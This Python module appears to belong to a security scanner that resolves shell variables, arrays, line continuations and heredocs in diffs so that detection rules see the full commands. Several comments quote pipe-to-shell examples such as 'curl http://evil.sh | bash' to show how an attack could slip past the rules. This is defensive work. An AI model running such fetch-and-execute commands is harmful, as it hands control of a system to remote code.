"""Extracted from _tokenizer_engine.py: _variables."""

import itertools
import re
from collections import deque
from functools import lru_cache
import shlex
from .._heredoc import parse_opener
from ..line_lex import QuoteState
from ._common import _ARRAY_ASSIGNMENT_RE, _ARRAY_ELEMENT_RE, _ASSIGNMENT_RE, _MAX_ARRAY_ENTRIES, _MAX_LINE_LEN, _MAX_TABLE_BYTES, _MAX_VALUE_LEN, _VAR_REF_RE, _declaration_options, _join_logical, _split_top_level
from ._expansion import resolve_expansions
from ._quotes import reconstruct_literals, reconstruct_literals_stateful

__all__ = ['_DIFF_TARGET_LINE_RE', '_SHELL_SOURCE_FILE_RE', '_assignments_are_shell', '_collect_array_entries', '_join_line_continuations_cached', '_split_with_lines', '_strip_outer_quotes', '_substitute', '_substitute_with_resolve', '_table_bytes', '_variable_table', '_variable_table_with_spans', 'join_line_continuations']

def _substitute_with_resolve_state(
    text: str,
    var_table: dict[str, str],
    array_table: dict[str, list[str]] | None = None,
    quote_before: QuoteState | None = None,
) -> tuple[str, bool, QuoteState, bool]:
    """Resolve a line and reconstruct it in its actual quote context."""
    array_table = array_table or {}
    state = quote_before or QuoteState()

    def replacer(match: re.Match) -> str:
        var = match.group(1) or match.group(2)
        if var in array_table:
            arr = array_table[var]
            return arr[0] if arr else match.group(0)
        return var_table.get(var, match.group(0))

    resolved = _VAR_REF_RE.sub(replacer, text)
    if len(resolved) > _MAX_LINE_LEN:
        return text, False, state, state.open
    ok = True
    if "${" in resolved:
        resolved, ok = resolve_expansions(resolved, var_table, array_table)
        if len(resolved) > _MAX_LINE_LEN:
            return text, False, state, state.open
    reconstructed, fully, after, quoted = reconstruct_literals_stateful(
        resolved, state,
    )
    if len(reconstructed) > _MAX_LINE_LEN:
        return text, False, state, quoted
    return reconstructed, ok and fully, after, quoted


def _substitute_with_resolve(
    text: str,
    var_table: dict[str, str],
    array_table: dict[str, list[str]] | None = None,
) -> tuple[str, bool]:
    """Resolve $var, ${var...} and ${arr[i]} references in *text*."""
    result, fully, _after, _quoted = _substitute_with_resolve_state(
        text, var_table, array_table,
    )
    return result, fully

def join_line_continuations(lines: list[str]) -> list[str]:
    """Cached on the lines: ten call sites join the same diff.

    A fresh list is returned because the result is a plain list and a
    caller is entitled to treat it as its own.
    """
    return list(_join_line_continuations_cached(tuple(lines)))

@lru_cache(maxsize=8)
def _join_line_continuations_cached(lines: tuple[str, ...]) -> tuple[str, ...]:
    """Join shell line continuations into single logical lines.

    Rules are matched one line at a time, so a command split with a
    trailing backslash slips past any pattern that has to see the whole
    pipeline::

        curl \\
          http://evil.sh | bash

    Without this, the CRITICAL "pipe to shell" rules see only ``curl \\``
    and the payload arrives as an unrelated fragment.  Only lines
    carrying the same diff marker are joined, so an addition is never
    spliced onto a removal.

    The joining itself lives in ``_common._join_logical``, shared with
    ``_joined_indexed``: the rule path and the coverage path must read the
    same logical lines, and two copies is how they stop doing that.
    """
    return tuple(text for _index, text in _join_logical(lines))

def _strip_outer_quotes(value: str) -> str:
    """Remove one matching pair of surrounding quotes, if present."""
    if (value.startswith('"') and value.endswith('"')) or (
        value.startswith("'") and value.endswith("'")
    ):
        return value[1:-1]
    return value

def _split_with_lines(text: str) -> list[tuple[str, int]]:
    """``shlex.split`` tokens paired with their 1-based source line.

    ``shlex`` exposes no token offset, but ``lineno`` read *before* each
    ``get_token`` is the line the token starts on, including a token whose
    quoted text spans lines.
    """
    lexer = shlex.shlex(text, posix=True)
    lexer.whitespace_split = True
    lexer.commenters = ""
    out: list[tuple[str, int]] = []
    while True:
        line = lexer.lineno
        token = lexer.get_token()
        if token is None:
            break
        out.append((token, line))
    return out

def _collect_array_entries(
    additions: list[str], start_idx: int
) -> tuple[int, list[str], list[int], bool]:
    """Collect the entries of a ``name=( ...)`` array starting at *start_idx*.

    Returns the index of the line that closed the array, the entries
    (outer quotes removed by ``shlex``), each entry's source line index in
    *additions*, and whether the assignment runs a command substitution
    (``$(`` or a backtick, comments excluded, quotes treated
    conservatively).  Nested parentheses inside quotes are ignored; the
    closing ``)`` that balances the opener is not included in the parsed
    content.  A refused assignment has no statically known contents, so
    the caller must let the name read as "not seen" rather than keep a
    partial or stale list.
    """
    first = additions[start_idx]
    m = _ARRAY_ASSIGNMENT_RE.match(first)
    if not m:
        return start_idx, [], []
    # *rest* is the text after the opening ``(`` on the first line; the
    # opener itself is represented by the initial depth of 1.
    rest = m.group("value")
    depth = 1
    in_single = in_double = False
    refused = False
    parts: list[str] = []
    offsets: list[int] = []
    collected = 0
    i = start_idx
    # No tail slice: one array assignment per line made copying the remaining
    # list quadratic in the number of added lines.
    remaining = itertools.islice(additions, start_idx + 1, None)
    for line_offset, line in enumerate(itertools.chain((rest,), remaining)):
        if collected + len(line) > _MAX_TABLE_BYTES:
            # Same refusal the table-size check raises later: an array this
            # large cannot be folded into a static value.
            raise ValueError(
                f"variable table exceeds {_MAX_TABLE_BYTES} bytes; refusing"
            )
        content: list[str] = []
        j = 0
        # A ``#`` that opens a comment (unquoted, at a word boundary) runs to
        # the end of the line and is not array data.  Without this the words
        # of an inline note inside ``depends=( # note )`` were read as
        # dependency names - H103 then reported the metadata and the recipe
        # disagreeing on ``depends`` because the comment lived in one and not
        # the other.
        comment = False
        boundary = True
        while j < len(line):
            ch = line[j]
            # A substitution that executes - unquoted or in double quotes,
            # but never inside a comment or single-quoted data - makes the
            # array's contents statically unknown.  The quote state comes
            # from the same scan that collects the entries, so the two
            # cannot disagree about what is code.
            if not comment and not in_single and not refused and (
                ch == "`"
                or (ch == "$" and j + 1 < len(line) and line[j + 1] == "(")
            ):
                refused = True
            if not in_single and not comment and ch == "\\" and j + 1 < len(line):
                content.append(ch)
                content.append(line[j + 1])
                j += 2
                boundary = False
                continue
            if in_double:
                if ch == '"':
                    in_double = False
                content.append(ch)
                j += 1
                boundary = False
                continue
            if in_single:
                if ch == "'":
                    in_single = False
                content.append(ch)
                j += 1
                boundary = False
                continue
            if comment:
                # Skip the rest of this physical line; the array may continue
                # on the next one, so only the comment text is dropped.
                break
            if ch == '"':
                in_double = True
                content.append(ch)
                j += 1
                boundary = False
                continue
            if ch == "'":
                in_single = True
                content.append(ch)
                j += 1
                boundary = False
                continue
            if ch == "#" and boundary:
                comment = True
                j += 1
                continue
            if ch == '(':
                depth += 1
                content.append(ch)
                j += 1
                boundary = False
                continue
            if ch == ')':
                depth -= 1
                if depth == 0:
                    break
                content.append(ch)
                j += 1
                boundary = False
                continue
            content.append(ch)
            boundary = ch.isspace() or ch in ";|&("
            j += 1
        content_text = "".join(content)
        parts.append(content_text)
        collected += len(content_text)
        offsets.append(line_offset)
        if depth == 0:
            break
        i += 1
    entries: list[str] = []
    entry_lines: list[int] = []
    if parts:
        try:
            for token, line_no in _split_with_lines("\n".join(parts)):
                if not token:
                    continue
                if len(entries) >= _MAX_ARRAY_ENTRIES or len(token) > _MAX_VALUE_LEN:
                    # Refuse, never keep a partial list: the array's contents
                    # are statically unknown from here on (A6).
                    refused = True
                    entries, entry_lines = [], []
                    break
                index = min(max(line_no - 1, 0), len(offsets) - 1)
                entries.append(token)
                entry_lines.append(start_idx + offsets[index])
        except ValueError:
            # A mid-array shlex failure leaves the contents statically
            # unknown: reportable as a refusal, exactly like a substitution
            # refusal, never an invisible empty array.
            refused = True
            entries, entry_lines = [], []
    return i, entries, entry_lines, refused

def _substitute(
    text: str,
    var_table: dict[str, str],
    array_table: dict[str, list[str]] | None = None,
    limit: int = _MAX_LINE_LEN,
) -> str:
    """Resolve variable and array references in *text*."""
    array_table = array_table or {}

    def replacer(match: re.Match) -> str:
        var = match.group(1) or match.group(2)
        if var in array_table:
            arr = array_table[var]
            return arr[0] if arr else match.group(0)
        return var_table.get(var, match.group(0))

    result = _VAR_REF_RE.sub(replacer, text)
    if len(result) > limit:
        return text
    if "${" in result:
        result, _ok = resolve_expansions(result, var_table, array_table)
        if len(result) > limit:
            return text
    reconstructed, _fully = reconstruct_literals(result)
    return reconstructed if len(reconstructed) <= limit else text

_SHELL_SOURCE_FILE_RE = re.compile(
    r"(?:^|/)(?:PKGBUILD|[^/]*\.(?:install|sh|bash|zsh|profile|bashrc|bash_profile|zshrc|zprofile|zshenv))$",
    re.IGNORECASE,
)

_DIFF_TARGET_LINE_RE = re.compile(r"^\+\+\+ (?:b/)?(.+?)(?:\t.*)?$")

def _opens_a_comment(line: str, index: int) -> bool:
    """True when ``line[index]`` is an unquoted ``#`` that starts a comment.

    The rule :mod:`trustsight.line_lex` applies, without importing it: a
    comment starts at the beginning of a word.  ``x#fragment`` and
    ``${var#pat}`` are data, and treating them as prose would blank real
    code.
    """
    return line[index] == "#" and (
        index == 0
        or line[index - 1].isspace()
        or line[index - 1] in ";|&("
    )

def _heredoc_openers(line: str) -> list[tuple[str, bool]]:
    found: list[tuple[str, bool]] = []
    quote = ""
    index = 0
    while index < len(line):
        char = line[index]
        if quote:
            if char == "\\" and quote == '"':
                index += 2
                continue
            if char == quote:
                quote = ""
            index += 1
            continue
        if char == "\\" and index + 1 < len(line):
            index += 2
            continue
        if char in "'\"":
            quote = char
            index += 1
            continue
        if char == "#" and _opens_a_comment(line, index):
            break
        if line.startswith("<<<", index):
            index += 3
            continue
        if line.startswith("<<", index):
            opener = parse_opener(line, index)
            if opener is not None:
                delimiter, strip_tabs, end = opener
                found.append((delimiter, strip_tabs))
                index = end
                continue
        index += 1
    return found


def _heredoc_delimiters(line: str) -> list[str]:
    r"""Delimiters a shell opens on *line*, quote- and comment-aware."""
    return [delimiter for delimiter, _strip_tabs in _heredoc_openers(line)]

def _assignments_are_shell(lines: list[str]) -> list[bool]:
    """Per line: may a `KEY=value` here be folded away as an assignment?

    In a shell file it may: the value goes into the table and is matched
    where it is *used*.  In a systemd unit or a `.desktop` file there is no
    later use - the value **is** the command, and folding it away removed
    the line from matching altogether.  `ExecStart=/bin/sh -c "curl ... |
    bash"` produced no candidate at all, so no resolved rule ever saw it.

    A diff with no `+++` header is treated as shell, which is what a
    fragment handed straight to `scan_diff` is.
    """
    flags: list[bool] = []
    shell = True
    # Bash reads the bodies in opener order, so two openers on one line
    # are a queue: A's body comes before B's.
    delimiters: deque[tuple[str, bool]] = deque()
    for line in lines:
        header = _DIFF_TARGET_LINE_RE.match(line)
        if header:
            path = header.group(1).strip()
            shell = path == "/dev/null" or bool(_SHELL_SOURCE_FILE_RE.search(path))
            delimiters.clear()
            flags.append(shell)
            continue
        body = line[1:] if line[:1] in ("+", "-", " ") else line
        if delimiters:
            flags.append(False)
            delimiter, strip_tabs = delimiters[0]
            probe = body.lstrip("\t") if strip_tabs else body
            if probe == delimiter:
                delimiters.popleft()
            continue
        flags.append(shell)
        delimiters.extend(_heredoc_openers(body))
    return flags

def _variable_table(
    additions: list[str],
) -> tuple[dict[str, str], dict[str, list[str]]]:
    """Resolve assignments among added lines into scalar and array tables."""
    var_table, array_table, _spans = _variable_table_with_spans(additions)
    return var_table, array_table

def _variable_table_with_spans(
    additions: list[str],
    shell_lines: list[bool] | None = None,
) -> tuple[dict[str, str], dict[str, list[str]], dict]:
    """The variable tables plus each value's source line index.

    Spans index into *additions*.  A scalar records the assignment line
    that last set it (a ``+=`` chain's final line); an array records its
    opener and closer lines and each entry's first line.  The tables'
    values are unchanged, so every existing caller reads what it read.
    """
    var_table: dict[str, str] = {}
    array_table: dict[str, list[str]] = {}
    scalar_lines: dict[str, int] = {}
    array_spans: dict[str, dict] = {}
    # A name is "kept" when a value for it was statically available at some
    # point: a folded scalar, or an array with collected entries (even when
    # the array itself is refused now, because the old reader stored it).
    # Reporting stays on that surface - only names that were never kept are
    # named as unresolved - because the X-series rates were adjudicated on
    # it, while a shadowed or substituted name still has to leave the
    # tables so no reader sees a stale or shredded value (A6).
    ever_kept: set[str] = set()
    reportable: dict[str, int] = {}
    if shell_lines is None:
        shell_lines = _assignments_are_shell(additions)
    if len(shell_lines) != len(additions):
        raise ValueError("shell_lines must parallel additions")
    i = 0
    while i < len(additions):
        line = additions[i]
        # A heredoc body is content: a Python `install = subprocess.run(` or
        # a unit file's `KEY=value` is not an assignment the shell makes.
        if not shell_lines[i]:
            i += 1
            continue
        # Arrays first: ``source=(... )`` may span multiple added lines.
        arr_match = _ARRAY_ASSIGNMENT_RE.match(line)
        if arr_match:
            name, op = arr_match.group("name"), arr_match.group("op")
            close_idx, entries, entry_lines, refused = _collect_array_entries(
                additions, i
            )
            if entries:
                ever_kept.add(name)
            # Only refused arrays are reportable.  An empty array is a
            # KNOWN value (``depends=()`` declares nothing), not a boundary;
            # reporting it trained the reader to skim the unresolved list.
            # A collection failure (a shlex error mid-array) still is one:
            # the contents are not statically known there, so the path is
            # marked refused to stay reportable.
            if refused:
                reportable.setdefault(name, i)
            if refused:
                # The assignment executes a substitution, so the array's
                # contents are statically unknown from this line on.  A
                # partial or stale list would be a wrong analysis; the name
                # reads as "not seen" instead (A6).
                array_table.pop(name, None)
                array_spans.pop(name, None)
            elif entries:
                if op == "+=":
                    array_table.setdefault(name, []).extend(entries)
                    span = array_spans.setdefault(
                        name, {"open": i, "close": close_idx, "entries": []}
                    )
                    span["entries"].extend(entry_lines)
                    span["close"] = close_idx
                else:
                    array_table[name] = entries
                    array_spans[name] = {
                        "open": i, "close": close_idx, "entries": list(entry_lines),
                    }
            i = close_idx + 1
            continue
        element_match = _ARRAY_ELEMENT_RE.match(line)
        if element_match:
            name = element_match.group("name")
            index = element_match.group("index")
            op = element_match.group("op")
            value = _split_top_level(element_match.group("value").strip())[0].strip()
            value = _strip_outer_quotes(value)
            slot = int(index) if index.isdigit() else -1
            if (
                0 <= slot < _MAX_ARRAY_ENTRIES
                and "$(" not in value
                and "`" not in value
                and len(value) <= _MAX_VALUE_LEN
            ):
                entries = array_table.setdefault(name, [])
                while len(entries) <= slot:
                    entries.append("")
                entries[slot] = entries[slot] + value if op == "+=" else value
                ever_kept.add(name)
            else:
                array_table.pop(name, None)
                array_spans.pop(name, None)
                reportable.setdefault(name, i)
            i += 1
            continue
        scalar_match = _ASSIGNMENT_RE.match(line)
        if scalar_match:
            options = _declaration_options(scalar_match)
            if "n" in options or "a" in options or "A" in options:
                i += 1
                continue
            name, op, value = (
                scalar_match.group("name"),
                scalar_match.group("op"),
                scalar_match.group("value").strip(),
            )
            # In `U=x; curl $U | bash` the shell assigns, then runs a
            # second command: only the first command's value is assigned.
            # Recording the whole tail made the value reference itself and
            # substitution re-expanded it until the size bound tripped.
            value = _split_top_level(value)[0].strip()
            value = _strip_outer_quotes(value)
            # A command substitution has no static value, so it cannot be
            # folded into the table.  The name's value is unknown from this
            # line on, so whatever a previous assignment left is dropped:
            # a stale value would be a wrong analysis, while an absent one
            # reads as "not seen" (A6).
            merged_value = (
                var_table.get(name, "") + value if op == "+=" else value
            )
            if (
                "$(" not in value
                and "`" not in value
                and len(merged_value) <= _MAX_VALUE_LEN
            ):
                var_table[name] = merged_value
                scalar_lines[name] = i
                ever_kept.add(name)
            else:
                var_table.pop(name, None)
                scalar_lines.pop(name, None)
                reportable.setdefault(name, i)
        i += 1

    for _ in range(10):
        new_table: dict[str, str] = {}
        for k, v in var_table.items():
            substituted, _ = _substitute_with_resolve(v, var_table, array_table)
            new_table[k] = substituted if len(substituted) <= _MAX_VALUE_LEN else v
        changed = new_table != var_table
        var_table = new_table
        # Checked every pass, including the first: the loop used to break
        # on equality before looking, and counted only the scalar table, so
        # a no-substitution recipe could return an array table of any size.
        if _table_bytes(var_table, array_table) > _MAX_TABLE_BYTES:
            # Refuse, never truncate: a shortened depends/source list is a
            # wrong analysis, not a smaller one, and A6 says an unresolved
            # value must read as not seen.
            raise ValueError(
                f"variable table exceeds {_MAX_TABLE_BYTES} bytes; refusing"
            )
        if not changed:
            break
    return var_table, array_table, {
        "scalars": scalar_lines,
        "arrays": array_spans,
        "refused": sorted(
            index for name, index in reportable.items()
            if name not in ever_kept
        ),
    }

def _table_bytes(scalars: dict[str, str], arrays: dict[str, list[str]]) -> int:
    """Total bytes the tables hold, arrays included."""
    total = sum(len(value) for value in scalars.values())
    for entries in arrays.values():
        total += sum(len(entry) for entry in entries)
    return total
